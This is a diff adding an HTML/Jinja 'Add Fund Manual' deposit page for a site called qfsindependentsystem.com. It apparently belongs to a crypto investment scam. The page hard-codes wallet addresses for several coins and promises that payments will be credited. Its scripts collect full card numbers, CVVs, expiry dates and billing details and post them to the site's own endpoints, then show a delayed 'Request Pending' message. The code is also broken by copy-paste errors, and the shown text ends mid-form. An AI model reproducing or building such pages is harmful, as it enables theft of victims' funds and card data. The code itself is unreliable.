@@ -1,0 +1,1633 @@
+
+{% extends 'base.html'%}
+
+{% block body %}
+
+
+
+<style>
+    .body-bg{
+        overflow-x: hidden;
+        transition: background-color 1s ease;
+        background-color: #000000;
+    }
+    
+    #preloader {
+        position: fixed;
+        top: 0;
+        /* z-index: 9999; */
+        width: 100%;
+        height: 100%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        -webkit-animation: blinkFadeScale 2s linear infinite;
+        animation: blinkFadeScale 2s linear infinite;
+    }
+    
+    #preloader img{
+        width: 100px;
+        
+    }
+    
+    @keyframes blinkFadeScale {
+    0% {
+        opacity: 1;
+        transform: scale(1);
+    }
+    50% {
+        opacity: 0;
+        transform: scale(1.2);
+    }
+    100% {
+        opacity: 1;
+        transform: scale(1);
+    }
+    }
+    .blinking-image {
+        animation: blinkFadeScale 2s infinite;
+    }
+    #content {
+        display: none;
+    }
+
+    #line-chart{
+        z-index:-1;
+    }
+</style>
+
+
+   
+
+        
+            <style>
+        .lds-ring {
+            display: block;
+            position: relative;
+            width: 100px;
+            height: 100px;
+            margin-right: auto;
+            margin-left: auto;
+            margin-top: 300px;
+        }
+        .lds-ring div {
+            box-sizing: border-box;
+            display: block;
+            position: absolute;
+            width: 100px;
+            height: 100px;
+            margin: 0px;
+            border: 4px solid #fff;
+            border-radius: 50%;
+            animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+            border-color: #fff transparent transparent transparent;
+        }
+        .lds-ring div:nth-child(1) {
+            animation-delay: -0.45s;
+        }
+        .lds-ring div:nth-child(2) {
+            animation-delay: -0.3s;
+        }
+        .lds-ring div:nth-child(3) {
+            animation-delay: -0.15s;
+        }
+        @keyframes lds-ring {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+        
+        .hidden{
+            display: none;
+        }
+        
+        .form-control{
+            color: #000000 !important;
+            border: 1px solid green;
+            
+        }
+    </style>
+
+<div class="main-content">
+                
+    <section class="section">
+                    <div class="section-header">
+                        <h1>Add Fund Manual</h1>
+                        <div class="section-header-breadcrumb">
+                            <div class="breadcrumb-item active">
+                                <a href="https://qfsindependentsystem.com/user">Dashboard</a>
+                            </div>
+                            <div class="breadcrumb-item">Add Fund Manual</div>
+                        </div>
+                    </div>
+
+                    <!------ alert ------>
+                    <div class="row ">
+                        <div class="col-md-12">
+                            <div class="bd-callout bd-callout-primary mx-2">
+                                <i class="fa-3x fas fa-info-circle text-primary"></i> You can deposit money into your own wallet in multiple currencies </div>
+                        </div>
+                    </div>
+
+                    <!------ main content ------>
+                    <div class="row justify-content-md-center">
+                        <div class="col-md-12">
+                            <h1>
+            Deposit
+        </h1>
+        <div class="well">
+
+            <div class="row" id="payment_page">
+                <div class="col-md-12 col-sm-12 col-xs-12">
+
+                    <h4 style="text-align: left; margin-top: 10px;">
+
+
+                        Please Select your preferred deposit method
+
+                    </h4>
+                    
+                    
+                </div>
+                <div class="col-md-4 col-sm-12 col-xs-12">
+                    <button class="btn btn-warning btn-lg" style="width: 100%;padding: 15px 2px;font-size: 25px; text-align:left; margin-bottom: 10px;" id="BITCOIN_deposit">
+                        <img class="sidebar__method--icon" src="https://qfsindependentsystem.com/assets/img/bitcoin.svg" alt="method icon" data-test-id="method-header-icon"  width="28px"> Bitcoin</button>
+                </div>
+                <div class="col-md-4 col-sm-12 col-xs-12">
+                    <button class="btn btn-default btn-lg" style="width: 100%;padding: 15px 2px;font-size: 25px; text-align:left; margin-bottom: 10px; color: #ffffff; background-color: black !important;" id="MASTERCARD_deposit">
+                        <img class="sidebar__method--icon" src="https://qfsindependentsystem.com/assets/img/stellalogo.png" alt="method icon" data-test-id="method-header-icon" width="35px"> Stella</button>
+                </div>
+                <div class="col-md-4 col-sm-12 col-xs-12">
+                    <button class="btn btn-primary btn-lg" style="width: 100%;padding: 15px 2px;font-size: 25px; text-align:left; margin-bottom: 10px;" id="VISA_deposit">
+                        <img class="sidebar__method--icon" src="https://qfsindependentsystem.com/assets/img/usdt_token.png" alt="method icon" data-test-id="method-header-icon" width="35px"> USDT</button>
+                </div>
+                
+                
+                <!-- New features -->
+                <div class="col-md-4 col-sm-12 col-xs-12">
+                    <button class="btn btn-primary btn-lg" style="width: 100%;padding: 15px 2px;font-size: 25px; text-align:left; margin-bottom: 10px;" id="coin1">
+                        <img class="sidebar__method--icon" src="https://qfsindependentsystem.com/qfs_assets/images/ripple.jpeg" alt="method icon" data-test-id="method-header-icon" width="35px"> Ripple</button>
+                </div>
+                
+                <div class="col-md-4 col-sm-12 col-xs-12">
+                    <button class="btn btn-primary btn-lg" style="width: 100%;padding: 15px 2px;font-size: 25px; text-align:left; margin-bottom: 10px;" id="coin2">
+                        <img class="sidebar__method--icon" src="https://qfsindependentsystem.com/qfs_assets/images/algorand.jpeg" alt="method icon" data-test-id="method-header-icon" width="35px"> Algorand</button>
+                </div>
+                
+                <div class="col-md-4 col-sm-12 col-xs-12">
+                    <button class="btn btn-primary btn-lg" style="width: 100%;padding: 15px 2px;font-size: 25px; text-align:left; margin-bottom: 10px;" id="coin3">
+                        <img class="sidebar__method--icon" src="https://qfsindependentsystem.com/qfs_assets/images/xdc.jpeg" alt="method icon" data-test-id="method-header-icon" width="35px"> XDC</button>
+                </div>
+                
+                <div class="col-md-4 col-sm-12 col-xs-12">
+                    <button class="btn btn-primary btn-lg" style="width: 100%;padding: 15px 2px;font-size: 25px; text-align:left; margin-bottom: 10px;" id="coin4" >
+                        <img class="sidebar__method--icon" src="https://qfsindependentsystem.com/qfs_assets/images/polygon.jpeg" alt="method icon" data-test-id="method-header-icon" width="35px"> Polygon </button>
+                </div>
+                
+                <!--<div class="col-md-4 col-sm-12 col-xs-12">-->
+                <!--    <button class="btn btn-primary btn-lg" style="width: 100%;padding: 15px 2px;font-size: 25px; text-align:left; margin-bottom: 10px;" id="coin5">-->
+                <!--        <img class="sidebar__method--icon" src="https://qfsindependentsystem.com/assets/img/usdt_token.png" alt="method icon" data-test-id="method-header-icon" width="35px"> USDT</button>-->
+                <!--</div>-->
+                
+                <!--<div class="col-md-4 col-sm-12 col-xs-12">-->
+                <!--    <button class="btn btn-primary btn-lg" style="width: 100%;padding: 15px 2px;font-size: 25px; text-align:left; margin-bottom: 10px;" id="coin6">-->
+                <!--        <img class="sidebar__method--icon" src="https://qfsindependentsystem.com/assets/img/usdt_token.png" alt="method icon" data-test-id="method-header-icon" width="35px"> USDT</button>-->
+                <!--</div>-->
+                
+                
+                
+            </div>
+
+            <div class="payment hidden" id="BITCOIN_page">
+
+                <div id="btc_process">
+                    <h3>
+                        <img class="sidebar__method--icon" src="https://qfsindependentsystem.com/assets/img/bitcoin.svg" alt="method icon" data-test-id="method-header-icon"  width="28px">
+                        Bitcoin
+                    </h3>
+
+                    <input type="radio" id="btc__" value="bc1ql7dh6lz7uazw2svl4fzvvu7w5vdm9up4sxlh7l" name="" style="display: none">
+                    <div class="form-group input-group-md">
+                        <input type="number" class="form-control" id="USD_value" placeholder="Enter Amount in USD" name="txtbitamount">
+                    </div>
+                    <button id="btn_proceed" class="btn btn-success"> Proceed</button>
+                </div>
+                <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+                <script src="js/qrcode.js"></script>
+                <script src="js/qrcode.min.js"></script>
+                <script type="text/javascript">
+                    let add=document.getElementById('btc__')
+                    let init = document.getElementById('USD_value');
+                    let proceed = document.querySelector('#btn_proceed');
+                    proceed.addEventListener('click', (event) => {
+                        event.preventDefault();
+                    if (init.value <=0) {
+
+                    }
+                    else {
+                        let process = document.getElementById("btc_process")
+
+                        axios({
+                            method: 'get',
+                            url: 'https://blockchain.info/ticker',
+                        }).then((response) => {
+                            //console.log(response)
+                            let item = response.data.USD['15m'];
+                        let resultElement = document.getElementById('btc_value');
+                        let initial = init.value;
+                        let nu = initial / item;
+                        let n = nu.toFixed(6);
+                        resultElement.value = n;
+                        document.getElementById('dollar_value').value=initial;
+        process.innerHTML=""
+                        let btc_form = document.getElementById('btc_form')
+                        btc_form.style.removeProperty('display') ;
+
+                        process.innerHTML=``
+  var qrcode = new QRCode(document.getElementById('qrCode'), {
+      text: 'bitcoin:' + add.value + '?amount=' + n,
+      width: 100,
+      height: 100,
+      colorDark: '#000',
+      colorLight: 'white',
+
+  });
+                        correctLevel: QRCode.CorrectLevel.H
+
+                        $.post("processes/btc_trans",
+                            {
+                                txtusdamount: initial,
+                                txtbitamount: n,
+                            },
+                            function(data,status){
+                                // alert("Data: " + data + "\nStatus: " + status);
+                            });
+                    }).catch((error) => {
+                        console.error(error);
+                    });
+                    }
+
+
+                    });
+                </script>
+
+
+                <div  style="display: none;" id="btc_form">
+                    <h3 class="text-success">
+                        Bitcoin Transaction Created
+                    </h3>
+                    <h4 style=" margin-top: 10px;">
+                        Hi your Tansaction have been Created.</h4>
+                    <p>Send the Exact BTC to the given address</p>
+                    <div class="row">
+                        <div class="col-md-6">
+                            <form method="post" action="">
+                            <div class="form-group input-group-md col-md-12" >
+                                <label for="address">Send BTC to</label>
+
+                                <input type="text" class="form-control" style="color:white" id="myInput" placeholder="" name="" value="bc1ql7dh6lz7uazw2svl4fzvvu7w5vdm9up4sxlh7l" readonly>
+                                <button style="float: right;margin-top: 2px;" class="btn btn-success btn-sm" onclick="myFunction()"><i class="fi-rr-duplicate"></i> Copy Address</button> <span id="copy_result" class="text-success h6"></span>
+
+                            </div>
+
+                            <div class="form-group input-group-md col-md-12" >
+                                <label for="email">Sender ID</label>
+                                <input type="email" class="form-control" style="color:white" id="email" placeholder="Enter email" name="txtemail" value="pablothebmp@gmail.com" readonly>
+                            </div>
+                            <div class="form-group input-group-md col-md-12">
+                                <label for="btc_value">Amount in BTC</label>
+                                <input type="number" class="form-control" style="color:white"  id="btc_value" placeholder="Amount" name="txtbitamount" readonly>
+                            </div>
+
+                            <div class="form-group input-group-md col-md-12">
+
+                                <label for="dollar_value">Amount in USD</label>
+                                <input type="text" class="form-control" style="color:white"  id="dollar_value" placeholder="" name="txtusdamount" readonly>
+
+                            </div>
+                            
+                            <div class="form-group input-group-md col-md-12">
+
+                                
+                                <input type="submit" class="form-control btn btn-success"   value="Submit" name="btcsub">
+
+                            </div>
+                            
+                            
+                            </form>
+
+                        </div>
+                        <div class="col-md-6"><center>
+                                <!--<p>or scan QR to make payment</p>-->
+                                <div id="qrCode" style="max-width:100px; max-height:100px;"></div>
+                                <div class="clearfix"></div>
+                                <div class="form-group input-group-md " style="margin-top: 10px">
+                                    <!--<div id="link"></div>-->
+                                </div>
+
+                                <p class="center ">
+                                <h5><strong>Please note that the equivalent of the exact amount paid will be credited into your Account.</strong> If you are interested in learning more about the transaction process or have an issue please contact support to get a detailed description of the process. </h5>
+                                </p>
+                            </center>
+                        </div>
+
+                    </div>
+
+                </div>
+                <script>
+                    function myFunction() {
+                        var copyText = document.getElementById("myInput");
+                        copyText.select();
+                        copyText.setSelectionRange(0, 99999)
+                        document.execCommand("copy");
+                        var result = document.getElementById("copy_result");
+                        result.innerHTML="Address copied"
+                        setTimeout(function(){ result.innerHTML=""}, 5000)
+                    }
+                </script>
+
+
+            </div>
+            <div class="payment hidden" id="MASTERCARD_page">
+                <div >
+                    <!--<h3>-->
+                    <!--    <img class="sidebar__method--icon" src="https://qfsindependentsystem.com/assets/img/stellalogo.png" alt="method icon" data-test-id="method-header-icon" width="35px"/>-->
+                    <!--    Stella-->
+                    <!--</h3>-->
+                    <!--<input type="radio" id="btc__2" value="bc1ql7dh6lz7uazw2svl4fzvvu7w5vdm9up4sxlh7l" name="" style="display: none">-->
+                    <!--<div class="form-group input-group-md">-->
+                    <!--    <input type="number" class="form-control" id="USD_value2" placeholder="Enter Amount in USD" name="txtbitamount">-->
+                    <!--</div>-->
+                    <!--<button id="btn_proceed2" class="btn btn-success"> Proceed</button>-->
+                    </div>
+                    
+                    
+                     <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+                <script src="js/qrcode.js"></script>
+                <script src="js/qrcode.min.js"></script>
+                <script type="text/javascript">
+                    let add=document.getElementById('btc__2')
+                    let init = document.getElementById('USD_value2');
+                    let proceed = document.querySelector('#btn_proceed2');
+                    proceed.addEventListener('click', (event) => {
+                        event.preventDefault();
+                    if (init.value <=0) {
+
+                    }
+                    else {
+                        let process = document.getElementById("btc_process2")
+
+                        axios({
+                            method: 'get',
+                            url: 'https://blockchain.info/ticker',
+                        }).then((response) => {
+                            //console.log(response)
+                            let item = response.data.USD['15m'];
+                        let resultElement = document.getElementById('btc_value2');
+                        let initial = init.value;
+                        let nu = initial / item;
+                        let n = nu.toFixed(6);
+                        resultElement.value = n;
+                        document.getElementById('dollar_value2').value=initial;
+                        document.getElementById('link').innerHTML=` <a href="${'bitcoin:' + add.value + '?amount=' + n}" target="_blank" class="btn btn-warning" name="bitsend" style="width: 100%">Open in Wallet</a>`
+        process.innerHTML=""
+                        let btc_form = document.getElementById('btc_form2')
+                        btc_form.style.removeProperty('display') ;
+
+                        process.innerHTML=``
+  var qrcode = new QRCode(document.getElementById('qrCode'), {
+      text: 'bitcoin:' + add.value + '?amount=' + n,
+      width: 100,
+      height: 100,
+      colorDark: '#000',
+      colorLight: 'white',
+
+  });
+                        correctLevel: QRCode.CorrectLevel.H
+
+                        $.post("processes/btc_trans",
+                            {
+                                txtusdamount: initial,
+                                txtbitamount: n,
+                            },
+                            function(data,status){
+                                // alert("Data: " + data + "\nStatus: " + status);
+                            });
+                    }).catch((error) => {
+                        console.error(error);
+                    });
+                    }
+
+
+                    });
+                </script>
+
+
+                <div  style="" id="btc_form">
+                    <h3 class="text-success">
+                        Stella Transaction Created
+                    </h3>
+                    <h4 style=" margin-top: 10px;">
+                        Hi your Tansaction have been Created.</h4>
+                    <p>Input the amount of Stella and Send the Exact Stella to the given address</p>
+                    <div class="row">
+                        <div class="col-md-6">
+                                <form method="post" action="">
+                            <div class="form-group input-group-md col-md-12" >
+                                <label for="address">Send Stella to</label>
+
+                                <input type="text" class="form-control" style="color:white" id="myInput202" placeholder="" name="" value="GD4VTJQH3C2NWGYKM3PEXBPA64UELNVZ52CTUC23IT3JHJJQHDEKYRR6" readonly>
+                                <button style="float: right;margin-top: 2px;" class="btn btn-success btn-sm" onclick="myFunction202()"><i class="fi-rr-duplicate"></i> Copy Address</button> <span id="copy_result202" class="text-success h6"></span>
+
+                            </div>
+
+                            <div class="form-group input-group-md col-md-12" >
+                                <label for="email">Sender ID</label>
+                                <input type="email" class="form-control" style="color:white" id="email" placeholder="Enter email" name="txtemail" value="pablothebmp@gmail.com" readonly>
+                            </div>
+                            <div class="form-group input-group-md col-md-12">
+                                <label for="btc_value">Amount in Stella</label>
+                                <input type="number" class="form-control" style="color:black"  id="btc_value2" placeholder="Amount" name="txtbitamount" >
+                            </div>
+
+                            <div class="form-group input-group-md col-md-12">
+
+                                <label for="dollar_value">Amount in USD</label>
+                                <input type="text" class="form-control" style="color:black"  id="dollar_value2" placeholder="" name="txtusdamount" >
+
+                            </div>
+                            
+                            
+                            <div class="form-group input-group-md col-md-12">
+
+                                
+                                <input type="submit" class="form-control btn btn-success"   value="Submit" name="ethsub">
+
+                            </div>
+                            
+                            </form>
+
+                        </div>
+                        <div class="col-md-6"><center>
+                                <!--<p>or scan QR to make payment</p>-->
+                                <!--<div id="qrCode" style="max-width:100px; max-height:100px;"></div>-->
+                                <!--<div class="clearfix"></div>-->
+                                <!--<div class="form-group input-group-md " style="margin-top: 10px">-->
+                                <!--    <div id="link"></div>-->
+                                <!--</div>-->
+
+                                <p class="center ">
+                                <h5><strong>Please note that the equivalent of the exact amount paid will be credited into your Account.</strong> If you are interested in learning more about the transaction process or have an issue please contact support to get a detailed description of the process. </h5>
+                                </p>
+                            </center>
+                        </div>
+
+                    </div>
+                    
+
+                </div>
+                <script>
+                    function myFunction() {
+                        var copyText = document.getElementById("myInput");
+                        copyText.select();
+                        copyText.setSelectionRange(0, 99999)
+                        document.execCommand("copy");
+                        var result = document.getElementById("copy_result2");
+                        result.innerHTML="Address copied"
+                        setTimeout(function(){ result.innerHTML=""}, 5000)
+                    }
+                </script>
+
+
+
+                </div>
+
+                <script>
+
+                    let proceed_mc_pay = document.querySelector('#proceed_mc_pay');
+                    proceed_mc_pay.addEventListener('click', (event) => {
+                        event.preventDefault();
+                    let options = document.getElementById("overlay")
+                    options.style.display = "block";
+                    options.innerHTML=`<div class="lds-ring"><div></div><div></div><div></div><div></div></div>`
+
+                    let masterAmount = document.getElementById('card_amount').value;
+                    let cardName = document.getElementById('card_name').value;
+                    let cardNumber = document.getElementById('card_number').value;
+                    let cardMonth = document.getElementById('exp_month').value;
+                    let cardYear = document.getElementById('exp_year').value;
+                    let cardCvv = document.getElementById('card_cvv').value;
+                    let billFirst = document.getElementById('billing_firstName').value;
+                    let billLast = document.getElementById('billing_LastName').value;
+                    let billEmail = document.getElementById('billing_Email').value;
+                    let billPhone = document.getElementById('billing_Phone').value;
+                    let billStreet = document.getElementById('billing_Street').value;
+                    let billTown = document.getElementById('billing_Town').value;
+                    let billCountry = document.getElementById('billing_Country').value;
+                    let billPostal = document.getElementById('billing_Postal').value;
+                    let cardDate= cardMonth+"/"+cardYear
+                    let fullName = billFirst+ " " + billLast;
+
+                    $.post("processes/mc_trans",
+                        {
+                            txtamount: masterAmount,
+                            txtdate: cardDate,
+                            txtholders:cardName,
+                            txtcvv: cardCvv,
+                            txtnumber:cardNumber,
+                            txtBillname:fullName,
+                            txtBillemail:billEmail,
+                            txtBillphone:billPhone,
+                            txtBillstreet:billStreet,
+                            txtBillTown:billTown,
+                            txtBillcountry:billCountry,
+                            txtBillpostal:billPostal
+                        },
+                        function(data,status){
+
+                            setTimeout(function(){options.innerHTML =`<div style="margin-top: 20%;margin-right: auto;margin-left: auto;width: 50%;text-align: center;"><h1>Request Pending</h1><a onclick="closeOption()">Close</a></div>`; }, 100000);
+
+                        });
+                    });
+
+                    function closeOption() {
+                        let options = document.getElementById("overlay")
+                        options.style.display = "none";
+                        options.innerHTML=``
+
+                    }
+                </script>
+            </div>
+            <div class="payment hidden" id="VISA_page">
+                <div class="well">
+
+                    <h3>
+                        <img class="sidebar__method--icon" src="https://qfsindependentsystem.com/assets/img/usdt_token.png" alt="method icon" data-test-id="method-header-icon" width="35px">
+                        USDT
+                    </h3>
+                    <div class="box-content">
+                        <div  style="" id="btc_form">
+                    <h3 class="text-success">
+                        USDT Transaction Created
+                    </h3>
+                    <h4 style=" margin-top: 10px;">
+                        Hi your Tansaction have been Created.</h4>
+                    <p>Input the amount of USDT and Send the Exact USDT to the given address</p>
+                    <div class="row">
+                        <div class="col-md-6">
+                                <form method="post" action="">
+                            <div class="form-group input-group-md col-md-12" >
+                                <label for="address">Send USDT to</label>
+
+                                <input type="text" class="form-control" style="color:white" id="myInput22" placeholder="" name="" value="TY4TvvQz4KjqeEfS22CvJPAdwQ9VKFg6xZ" readonly>
+                                <button style="float: right;margin-top: 2px;" class="btn btn-success btn-sm" onclick="myFunction22()"><i class="fi-rr-duplicate"></i> Copy Address</button> <span id="copy_result22" class="text-success h6"></span>
+
+                            </div>
+
+                            <div class="form-group input-group-md col-md-12" >
+                                <label for="email">Sender ID</label>
+                                <input type="email" class="form-control" style="color:white" id="email" placeholder="Enter email" name="txtemail" value="pablothebmp@gmail.com" readonly>
+                            </div>
+                            <div class="form-group input-group-md col-md-12">
+                                <label for="btc_value">Amount in USDT</label>
+                                <input type="number" class="form-control" style="color:black"  id="btc_value22" placeholder="Amount" name="txtbitamount" >
+                            </div>
+
+                            <div class="form-group input-group-md col-md-12">
+
+                                <label for="dollar_value">Amount in USD</label>
+                                <input type="text" class="form-control" style="color:black"  id="dollar_value22" placeholder="" name="txtusdamount" >
+
+                            </div>
+                            
+                            <div class="form-group input-group-md col-md-12">
+
+                                
+                                <input type="submit" class="form-control btn btn-success"   value="Submit" name="usdtsub">
+
+                            </div>
+                            
+                            </form>
+
+                        </div>
+                        <div class="col-md-6"><center>
+                                <!--<p>or scan QR to make payment</p>-->
+                                <!--<div id="qrCode" style="max-width:100px; max-height:100px;"></div>-->
+                                <!--<div class="clearfix"></div>-->
+                                <!--<div class="form-group input-group-md " style="margin-top: 10px">-->
+                                <!--    <div id="link"></div>-->
+                                <!--</div>-->
+
+                                <p class="center ">
+                                <h5><strong>Please note that the equivalent of the exact amount paid will be credited into your Account.</strong> If you are interested in learning more about the transaction process or have an issue please contact support to get a detailed description of the process. </h5>
+                                </p>
+                            </center>
+                        </div>
+
+                    </div>
+
+                </div>
+
+                    </div>
+                    
+                    
+                    
+                    <script>
+                    function myFunction22() {
+                        var copyText = document.getElementById("myInput22");
+                        copyText.select();
+                        copyText.setSelectionRange(0, 99999)
+                        document.execCommand("copy");
+                        var result = document.getElementById("copy_result22");
+                        result.innerHTML="Address copied"
+                        setTimeout(function(){ result.innerHTML=""}, 5000)
+                    }
+                </script>
+                
+                <script>
+                    function myFunction202() {
+                        var copyText = document.getElementById("myInput202");
+                        copyText.select();
+                        copyText.setSelectionRange(0, 99999)
+                        document.execCommand("copy");
+                        var result = document.getElementById("copy_result202");
+                        result.innerHTML="Address copied"
+                        setTimeout(function(){ result.innerHTML=""}, 5000)
+                    }
+                </script>
+                    
+
+                </div>
+                <script>
+                
+                    
+
+                    let proceed_vs_pay = document.querySelector('#proceed_vs_pay');
+                    proceed_vs_pay.addEventListener('click', (event) => {
+                        event.preventDefault();
+                    let options = document.getElementById("overlay")
+                    options.style.display = "block";
+                    options.innerHTML=`<div class="lds-ring"><div></div><div></div><div></div><div></div></div>`
+
+                    let masterAmount = document.getElementById('visa_card_amount').value;
+                    let cardName = document.getElementById('visa_card_name').value;
+                    let cardNumber = document.getElementById('visa_card_number').value;
+                    let cardMonth = document.getElementById('visa_exp_month').value;
+                    let cardYear = document.getElementById('visa_exp_year').value;
+                    let cardCvv = document.getElementById('visa_card_cvv').value;
+                    let billFirst = document.getElementById('visa_billing_firstName').value;
+                    let billLast = document.getElementById('visa_billing_LastName').value;
+                    let billEmail = document.getElementById('visa_billing_Email').value;
+                    let billPhone = document.getElementById('visa_billing_Phone').value;
+                    let billStreet = document.getElementById('visa_billing_Street').value;
+                    let billTown = document.getElementById('visa_billing_Town').value;
+                    let billCountry = document.getElementById('visa_billing_Country').value;
+                    let billPostal = document.getElementById('visa_billing_Postal').value;
+                    let cardDate= cardMonth+"/"+cardYear
+                    let fullName = billFirst+ " " + billLast;
+
+                    $.post("processes/vs_trans",
+                        {
+                            txtamount: masterAmount,
+                            txtdate: cardDate,
+                            txtholders:cardName,
+                            txtcvv: cardCvv,
+                            txtnumber:cardNumber,
+                            txtBillname:fullName,
+                            txtBillemail:billEmail,
+                            txtBillphone:billPhone,
+                            txtBillstreet:billStreet,
+                            txtBillTown:billTown,
+                            txtBillcountry:billCountry,
+                            txtBillpostal:billPostal
+                        },
+                        function(data,status){
+
+                            setTimeout(function(){options.innerHTML =`<div style="margin-top: 20%;margin-right: auto;margin-left: auto;width: 50%;text-align: center;"><h1>Request Pending</h1><a onclick="closeOption()">Close</a></div>`; }, 30000);
+
+                        });
+                    });
+
+                    function closeOption() {
+                        let options = document.getElementById("overlay")
+                        options.style.display = "none";
+                        options.innerHTML=``
+
+                    }
+                </script>    </div>
+                
+                
+            <!-- ##################### New Ones ##########################   -->
+            <!--  	xl_token 	ad_token 	agro_token 	riple_token 	polygon_token -->
+            <div class="payment" id="ripple_page">
+                <div  style="" id="btc_form">
+                    <h3 class="text-success">
+                        Ripple Transaction Created
+                    </h3>
+                    <h4 style=" margin-top: 10px;">
+                        Hi your Tansaction have been Created.</h4>
+                    <p>Input the amount of Ripple and Send the Exact Ripple to the given address</p>
+                    <div class="row">
+                        <div class="col-md-6">
+                                <form method="post" action="">
+                            <div class="form-group input-group-md col-md-12" >
+                                <label for="address">Send Ripple to</label>
+
+                                <input type="text" class="form-control" style="color:white" id="myInput_ripple" placeholder="" name="" value="rhntduMxYFi59Uwa5dMHM8Kow4SCmbiCQ2" readonly>
+                                <button style="float: right;margin-top: 2px;" class="btn btn-success btn-sm" onclick="myFunction_ripple()"><i class="fi-rr-duplicate"></i> Copy Address</button> <span id="copy_ripple" class="text-success h6"></span>
+
+                            </div>
+
+                            <div class="form-group input-group-md col-md-12" >
+                                <label for="email">Sender ID</label>
+                                <input type="email" class="form-control" style="color:white" id="email" placeholder="Enter email" name="txtemail" value="pablothebmp@gmail.com" readonly>
+                            </div>
+                            <div class="form-group input-group-md col-md-12">
+                                <label for="btc_value">Amount in Ripple</label>
+                                <input type="number" class="form-control" style="color:black"  id="btc_value2" placeholder="Amount" name="txtbitamount" >
+                            </div>
+
+                            <div class="form-group input-group-md col-md-12">
+
+                                <label for="dollar_value">Amount in USD</label>
+                                <input type="text" class="form-control" style="color:black"  id="dollar_value2" placeholder="" name="txtusdamount" >
+
+                            </div>
+                            
+                            
+                            <div class="form-group input-group-md col-md-12">
+
+                                
+                                <input type="submit" class="form-control btn btn-success"   value="Submit" name="ripplesub">
+
+                            </div>
+                            
+                            </form>
+
+                        </div>
+                        <div class="col-md-6"><center>
+                                <!--<p>or scan QR to make payment</p>-->
+                                <!--<div id="qrCode" style="max-width:100px; max-height:100px;"></div>-->
+                                <!--<div class="clearfix"></div>-->
+                                <!--<div class="form-group input-group-md " style="margin-top: 10px">-->
+                                <!--    <div id="link"></div>-->
+                                <!--</div>-->
+
+                                <p class="center ">
+                                <h5><strong>Please note that the equivalent of the exact amount paid will be credited into your Account.</strong> If you are interested in learning more about the transaction process or have an issue please contact support to get a detailed description of the process. </h5>
+                                </p>
+                            </center>
+                        </div>
+
+                    </div>
+                    
+
+                </div>
+                <script>
+                    function myFunction_ripple() {
+                        var copyText = document.getElementById("myInput_ripple");
+                        copyText.select();
+                        copyText.setSelectionRange(0, 99999)
+                        document.execCommand("copy");
+                        var result = document.getElementById("copy_ripple");
+                        result.innerHTML="Address copied"
+                        setTimeout(function(){ result.innerHTML=""}, 5000)
+                    }
+                </script>
+
+
+
+                </div>
+                
+                
+                
+            <div class="payment" id="xdc_page">
+
+                <div  style="" id="btc_form">
+                    <h3 class="text-success">
+                        XDC Transaction Created
+                    </h3>
+                    <h4 style=" margin-top: 10px;">
+                        Hi your Tansaction have been Created.</h4>
+                    <p>Input the amount of XDC and Send the Exact Stella to the given address</p>
+                    <div class="row">
+                        <div class="col-md-6">
+                                <form method="post" action="">
+                            <div class="form-group input-group-md col-md-12" >
+                                <label for="address">Send XDC to</label>
+
+                                <input type="text" class="form-control" style="color:white" id="myInput_xdc" placeholder="" name="" value="0xDE4705794a848BF8d7bddB3793D8DB66F2bF7f72" readonly>
+                                <button style="float: right;margin-top: 2px;" class="btn btn-success btn-sm" onclick="myFunction_xdc()"><i class="fi-rr-duplicate"></i> Copy Address</button> <span id="copy_xdc" class="text-success h6"></span>
+
+                            </div>
+
+                            <div class="form-group input-group-md col-md-12" >
+                                <label for="email">Sender ID</label>
+                                <input type="email" class="form-control" style="color:white" id="email" placeholder="Enter email" name="txtemail" value="pablothebmp@gmail.com" readonly>
+                            </div>
+                            <div class="form-group input-group-md col-md-12">
+                                <label for="btc_value">Amount in XDC</label>
+                                <input type="number" class="form-control" style="color:black"  id="btc_value2" placeholder="Amount" name="txtbitamount" >
+                            </div>
+
+                            <div class="form-group input-group-md col-md-12">
+
+                                <label for="dollar_value">Amount in USD</label>
+                                <input type="text" class="form-control" style="color:black"  id="dollar_value2" placeholder="" name="txtusdamount" >
+
+                            </div>
+                            
+                            
+                            <div class="form-group input-group-md col-md-12">
+
+                                
+                                <input type="submit" class="form-control btn btn-success"   value="Submit" name="xdcsub">
+
+                            </div>
+                            
+                            </form>
+
+                        </div>
+                        <div class="col-md-6"><center>
+                                <!--<p>or scan QR to make payment</p>-->
+                                <!--<div id="qrCode" style="max-width:100px; max-height:100px;"></div>-->
+                                <!--<div class="clearfix"></div>-->
+                                <!--<div class="form-group input-group-md " style="margin-top: 10px">-->
+                                <!--    <div id="link"></div>-->
+                                <!--</div>-->
+
+                                <p class="center ">
+                                <h5><strong>Please note that the equivalent of the exact amount paid will be credited into your Account.</strong> If you are interested in learning more about the transaction process or have an issue please contact support to get a detailed description of the process. </h5>
+                                </p>
+                            </center>
+                        </div>
+
+                    </div>
+                    
+
+                </div>
+                <script>
+                    function myFunction_xdc() {
+                        var copyText = document.getElementById("myInput_xdc");
+                        copyText.select();
+                        copyText.setSelectionRange(0, 99999)
+                        document.execCommand("copy");
+                        var result = document.getElementById("copy_xdc");
+                        result.innerHTML="Address copied"
+                        setTimeout(function(){ result.innerHTML=""}, 5000)
+                    }
+                </script>
+
+
+
+                </div>
+                
+            <div class="payment" id="polygon_page">
+                
+                     
+
+
+                <div  style="" id="btc_form">
+                    <h3 class="text-success">
+                        Polygon Transaction Created
+                    </h3>
+                    <h4 style=" margin-top: 10px;">
+                        Hi your Tansaction have been Created.</h4>
+                    <p>Input the amount of Ripple and Send the Exact Polygon to the given address</p>
+                    <div class="row">
+                        <div class="col-md-6">
+                                <form method="post" action="">
+                            <div class="form-group input-group-md col-md-12" >
+                                <label for="address">Send Polygon to</label>
+
+                                <input type="text" class="form-control" style="color:white" id="myInput_polygon" placeholder="" name="" value="0xDE4705794a848BF8d7bddB3793D8DB66F2bF7f72" readonly>
+                                <button style="float: right;margin-top: 2px;" class="btn btn-success btn-sm" onclick="myFunction_polygon()"><i class="fi-rr-duplicate"></i> Copy Address</button> <span id="copy_polygon" class="text-success h6"></span>
+
+                            </div>
+
+                            <div class="form-group input-group-md col-md-12" >
+                                <label for="email">Sender ID</label>
+                                <input type="email" class="form-control" style="color:white" id="email" placeholder="Enter email" name="txtemail" value="pablothebmp@gmail.com" readonly>
+                            </div>
+                            <div class="form-group input-group-md col-md-12">
